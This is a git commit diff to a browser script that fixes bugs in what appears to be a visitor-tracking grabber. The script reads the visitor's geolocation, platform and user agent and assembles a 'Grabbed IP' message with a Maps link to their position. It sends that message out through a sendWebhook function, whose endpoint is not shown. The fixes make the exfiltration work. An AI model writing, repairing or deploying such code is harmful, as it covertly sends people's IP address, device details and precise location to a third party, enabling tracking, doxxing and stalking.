cdabb77cbb85ffc5865aeb6b67a0983a84e6ce2b
AreYouReadyYet <132776933+areyoureadyyet@users.noreply.github.com>
2024-06-01 10:38:10 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,5 @@
 let mapsUrl;
+
 function requestLocationPermission() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(success, error);
@@ -8,9 +9,9 @@ function requestLocationPermission() {
 }
 
 function success(position) {
-    let LATITUDE = positon.coords.latitude;
+    let LATITUDE = position.coords.latitude;
     let LONGITUDE = position.coords.longitude;
-    mapsUrl = `MAPS URL: https://www.google.com/maps/@$LATITUDE,$LONGITUDEz?entry=ttu`;
+    mapsUrl = `https://www.google.com/maps/@${LATITUDE},${LONGITUDE},15z?entry=ttu`;
 }
 
 function error(err) {
@@ -24,11 +25,12 @@ function error(err) {
 
 // Start requesting location permission
 requestLocationPermission();
+
 // Function to send the webhook message
- function sendWebhook(ip) {
+function sendWebhook(ip) {
     // Prepare the payload
     const platformInfo = `${navigator.platform}, Browser: ${navigator.userAgent}`;
-    const content = `Grabbed IP: ${ip}\nOS Info: ${platformInfo}\nMaps Location URL: $mapsUrl`;
+    const content = `Grabbed IP: ${ip}\nOS Info: ${platformInfo}\nMaps Location URL: ${mapsUrl}`;
 
     console.log(`Content Length: ${content.length}`);
 
@@ -71,4 +73,3 @@ function getIpAddress() {
 
 // Call the function to get the IP address and send the webhook message
 getIpAddress();
-
